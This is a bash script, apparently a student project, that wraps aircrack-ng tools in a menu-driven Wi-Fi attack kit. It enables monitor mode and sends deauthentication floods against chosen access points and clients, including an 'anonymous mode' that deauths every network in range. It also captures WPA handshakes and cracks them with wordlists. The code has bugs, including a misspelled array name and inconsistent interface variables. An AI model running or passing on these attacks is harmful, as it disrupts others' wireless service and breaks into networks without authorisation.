#!/bin/bash
# Define color variables
R='\033[0;31m'
G='\033[0;32m'
Y='\033[0;33m'
NC='\033[0m' # No Color

# Print the banner with colors centeR on the screen
echo -e "${R}$ '^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^'"
echo -e "${G}$ '                                                                B       '"
echo -e "${Y}$ '    ██████████          ██████        ████████████████████      C       '"
echo -e "${R}$ '    ███████████         ██████       ██████████████████████     A       '"
echo -e "${G}$ '    ███████ ████        ██████       ██████         ███████             '"
echo -e "${Y}$ '    ███████  ████       ██████       ██████         ███████     5th     '"
echo -e "${R}$ '    ███████   █████     ██████       ██████         ███████             '"
echo -e "${G}$ '    ███████    █████    ██████       ██████████████████████     S | 2 | '"
echo -e "${Y}$ '    ███████     █████   ██████       ██████████████████████     E | 0 | '"
echo -e "${R}$ '    ███████      █████  ██████       ██████         ███████     M | 2 | '"
echo -e "${G}$ '    ███████       █████ ██████       ██████         ███████       | 4 | '"
echo -e "${Y}$ '    ███████        ███████████       ██████         ███████     P       '"
echo -e "${R}$ '    ███████         ██████████       ██████         ███████     J       '"
echo -e "${G}$ '                                                                        '"
echo -e "${Y}$ '                                   NETWORK ANALYZER                   -AZ_SEP '"
echo -e "${R}$ '^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^'"
echo -e "${NC}"

#RequiR tools
echo -e "${G} _______________${NC}"
echo -e "${G}|${NC}REQUIR TOOLS:${G}|${NC}"
echo -e "${G}|${NC}1. ${Y}aircrack-ng ${G}|${NC}"
echo -e "${G}|${NC}2. ${Y}airmon-ng   ${G}|${NC}"
echo -e "${G}|${NC}3. ${Y}airodump-ng ${G}|${NC}"
echo -e "${G}|${NC}4. ${Y}aireplay-ng ${G}|${NC}"
echo -e "${G}|${NC}5. ${Y}BCA-crack   ${G}|${NC}"
echo -e "${G}|${NC}_______________${NC}|"
echo ""
echo -e "This tools require ${R}ADMIN${NC} previlge"

# All function with sudo need Admin Permission
# Array of interfaces names to check
interfaces=("wlp2s0" "wlan0" "wlan1" "wlan2") # Define your interfaces
interfaces_found=0

# Iterate through the array and check if each interfaces exists
for interfaces in "${interfacess[@]}"; do
    if ip link show "$interfaces" &>/dev/null; then
        echo "WLAN interfaces found: $interfaces"
        interfaces_found=1
        break  # Exit the loop if any interfaces is found
    fi
done

# If none of the interfacess are found
if [ "$interfaces_found" -eq 0 ]; then
    echo "No WLAN interfaces found."
fi

#python server to host the webpage
gnome-terminal -- python3 server.py

printinfo="Enter any key to exit to main MENU "

# Function to enable monitor mode 
enable_monitor_mode() {
    echo "1. Enable Monitor Mode"
    echo "2. Check Network Status"
    echo ""
    echo "$printinfo"
    echo ""
    read -p "option:" option
    case $option in
        1)
            echo "Using interfaces $interfaces"
            sudo airmon-ng start $interfaces
            echo "Starting Monitoring Mode.."
            ;;
        2)
            sudo systemctl status NetworkManager
            ;;
        *)
        echo "invalid option"
        ;;
    esac
}
# Function to disable monitor mode
disable_monitor_mode() {
    echo "disabling monitoring mode ..."
    sudo airmon-ng stop $interfaces"mon"
    echo ""
    echo "if the given interfaces does not exist it may be because monitoring mode is not anable"
}
# Function for network deauthentication
network_deauthentication() {
    echo "Monitoring Mode is Required for this tools"
    echo ""
    echo "Deauth option:"
    echo "1. Discover Network"
    echo "2. Manual Mode"
    echo ""
    echo "$printinfo"
    echo ""
    read -p "option:" option
    case $option in
        1)
            echo "Entering Network DiscoveR Mode..."
            echo ""
            echo "Enter Network interfaces (default is $interfaces):"
            read Netinterfaces
            if [ -z "$Netinterfaces" ];
            then
                Netinterfaces="$interfaces"
            fi
            echo "Discovering..."
            echo ""
            mkdir -p SaveData
            sudo airodump-ng --output-format csv -w "$(pwd)/SaveData/" "${interfaces}mon"
            echo "Data exported"
            echo ""
            ;;
        2)
            echo "Entering Manual Mode..."
            echo "Enter AP MAC / BSSID address:"
            read hostmac
            echo "Enter Client MAC / BSSID address:"
            read clientmac
            echo "Enter Number of deauthentication"
            echo "Enter 0 for auto" 
            read deauthno
            sudo aireplay-ng -0 $deauthno -a "$hostmac" -c "$clientmac" $interfaces"mon"
        ;;
        *)
            echo "invalid option"
        ;;
    esac
}

# Function for capturing handshake
capture_handshake() {
    echo"Entering Capturing Mode.."
    echo "1. Manual Mode"
    echo "2. Select Available Network"
    echo ""
    echo "$printinfo"
    echo ""
    read -p "option:" option
    case $option in
        1)
            echo "Used OPTION 3 To DiscoveR Networks"
            echo ""
            echo "Enter channel:"
            read channel
            echo "Enter AP MAC address:"
            read ap_mac
            echo "Enter output file name (without extension):"
            read outputfile
            echo "Enter valid details!"
            sudo airodump-ng -c "$channel" --bssid "$ap_mac" -w "$outputfile" $interfaces #mon requied not not
        ;;
        2)
            #Scan for Available Networks and Capture Handshake
            echo "Scanning for available networks..."
            sudo airmon-ng start $interfaces
            sudo airodump-ng $interfaces"mon" | tee scan_results.txt

            #Extract the BSSID and Channel of the Strongest Network
            bssid=$(grep -o -E "([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})" scan_results.txt | head -n 1)
            channel=$(grep -o -E "Channel: [0-9]+" scan_results.txt | head -n 1 | cut -d' ' -f2)

            #Capture the Handshake for the Strongest Network
            if [ -n "$bssid" ] && [ -n "$channel" ]; then
                echo "Capturing handshake for the strongest network..."
                echo "Output file name (without extension):"
                read outputfile
                sudo airodump-ng -c $channel --bssid $bssid -w $outputfile $interfaces
            else
                echo "No networks found. Exiting..."
            fi
            # Cleanup: Remove the scan results file
           # rm -f scan_results.txt
        ;;
        *)
            #if input is invalid
            echo "Invalid option"
        ;;
    esac  
}

# Function for encryption vulnerability testing
encryption_vulnerability_testing() {
    echo "Enter AP MAC address:"
    read ap_mac
    echo "Enter handshake file name (without extension):"
    read handshake_file
    echo "Enter wordlist file name (including path if not in current directory):"
    read wordlist
    sudo aircrack-ng -w "$wordlist" -b "$ap_mac" "$handshake_file.cap"
}

# Function for network monitoring
network_monitoring() {
    sudo airodump-ng $interface"mon"
}

# Function for anonymous mode
anonymous_mode() {
    echo "Entering anonymous mode..."
    echo "Selected $interfaces Network Interface"
    # Deauthenticate clients from all available networks
    sudo aireplay-ng --deauth 0 -e "*" -a FF:FF:FF:FF:FF:FF $interface"mon"
    echo "Process completed"
}
# Function for password cracking
password_cracking() {
    echo "Password cracking options:"
    echo "Password list is available at /Final/vulnerability/..txt"
    echo "1. Brute Force"
    echo "2. BCA-cracker"
    echo ""
    echo "$printinfo"
    echo ""
    read -p "Select an option: " option
    case $option in
        1)
            echo "Starting Brute Force attack..."
            echo "Enter Directory for Handshake File"
            read directory
            echo "Enter wordlist file name (including path if not in current directory):"
            read wordlist
            sudo aircrack-ng -w "$wordlist" "$directory"
            ;;
        2)
            echo "Starting BCA cracker attack..."
            echo "developing"
            ;;
        *)
            echo "Invalid option"
            ;;
    esac
}
# Main menu
while true; do
    echo ""
    echo "Select an option:"
    echo "1. Enable Monitor Mode"
    echo "2. Disable Monitor Mode"
    echo "3. Network Deauthentication"
    echo "4. Capture Handshake"
    echo "5. WiFi Network Encryption Vulnerability Testing"
    echo "6. Network Monitoring"
    echo "7. Anonymous Mode"
    echo "8. Password Cracking (BF & G-crack)"
    echo "9. Exit"
    echo ""
    echo "Ctl + C to exit the process"
    read -p "Enter your choice: " choice
    echo ""
    case $choice in
        1)
            enable_monitor_mode
            ;;
        2)
            disable_monitor_mode
            ;;
        3)
            network_deauthentication
            ;;
        4)
            capture_handshake
            ;;
        5)
            encryption_vulnerability_testing
            ;;
        6)
            network_monitoring
            ;;
        7)
            anonymous_mode
            ;;
        8)
            password_cracking
            ;;
        9)
            echo "Exiting..."
            exit 0
            ;;
        *)
            echo "Invalid option"
        ;;
    esac
done
